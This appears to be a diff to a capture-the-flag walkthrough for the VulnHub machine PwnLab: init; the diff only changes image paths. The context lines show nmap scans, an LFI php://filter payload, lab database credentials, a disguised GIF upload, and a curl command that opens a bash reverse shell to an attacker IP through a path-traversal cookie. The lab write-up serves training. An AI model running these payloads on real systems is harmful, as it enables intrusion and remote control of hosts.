@@ -3,7 +3,7 @@
 - **Machine:** PwnLab: init
 - **Download:** https://www.vulnhub.com/entry/pwnlab-init,158/
 
-![](844-1.png)
+![](images/844-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](844-2.png)
+![](images/844-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Perform a complete scan to identify open ports, running services, operating syst
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.222
 ```
 
-![](844-3.png)
+![](images/844-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.222
 ```
 
-![](844-4.png)
+![](images/844-4.png)
 
 ---
 
@@ -83,7 +83,7 @@ Click the **Login** button or visit:
 http://192.168.2.222/?page=login
 ```
 
-![](844-5.png)
+![](images/844-5.png)
 
 The application loads pages through the `page` parameter, indicating a potential **Local File Inclusion (LFI)** vulnerability.
 
@@ -93,7 +93,7 @@ The application loads pages through the `page` parameter, indicating a potential
 
 Capture the request using Burp Suite.
 
-![](844-6.png)
+![](images/844-6.png)
 
 Send the request to **Repeater** and replace the parameter with:
 
@@ -101,7 +101,7 @@ Send the request to **Repeater** and replace the parameter with:
 ?page=php://filter/convert.base64-encode/resource=config
 ```
 
-![](844-7.png)
+![](images/844-7.png)
 
 The response contains Base64-encoded PHP source.
 
@@ -111,7 +111,7 @@ Decode it.
 echo 'PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+' | base64 -d
 ```
 
-![](844-8.png)
+![](images/844-8.png)
 
 Recovered database configuration:
 
@@ -134,7 +134,7 @@ Connect to the remote MySQL service.
 mysql --skip-ssl -h 192.168.2.222 Users -u root -pH4u%QJ_H99
 ```
 
-![](844-9.png)
+![](images/844-9.png)
 
 Enumerate the users table.
 
@@ -142,7 +142,7 @@ Enumerate the users table.
 SELECT * FROM users;
 ```
 
-![](844-10.png)
+![](images/844-10.png)
 
 The stored passwords are Base64 encoded.
 
@@ -160,7 +160,7 @@ echo 'U0lmZHNURW42SQ==' | base64 -d
 echo 'aVN2NVltMkdSbw==' | base64 -d
 ```
 
-![](844-11.png)
+![](images/844-11.png)
 
 Recovered credentials:
 
@@ -180,7 +180,7 @@ Login to the application.
 http://192.168.2.222/?page=login
 ```
 
-![](844-12.png)
+![](images/844-12.png)
 
 After successful authentication, navigate to the upload page.
 
@@ -188,7 +188,7 @@ After successful authentication, navigate to the upload page.
 http://192.168.2.222/?page=upload
 ```
 
-![](844-13.png)
+![](images/844-13.png)
 
 ---
 
@@ -209,11 +209,11 @@ GIF89a;
 
 Upload the file through the upload page.
 
-![](844-14.png)
+![](images/844-14.png)
 
 After uploading, verify the uploaded file under the upload directory.
 
-![](844-15.png)
+![](images/844-15.png)
 
 ---
 
@@ -231,11 +231,11 @@ Trigger the uploaded shell by abusing the application's cookie.
 curl -b "lang=../upload/a131d09d22d1ec4f204e952068447736.gif" "http://192.168.2.222/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.2.219/443+0>%261'"
 ```
 
-![](844-16.png)
+![](images/844-16.png)
 
 A reverse shell is established.
 
-![](844-17.png)
+![](images/844-17.png)
 
 ---
 
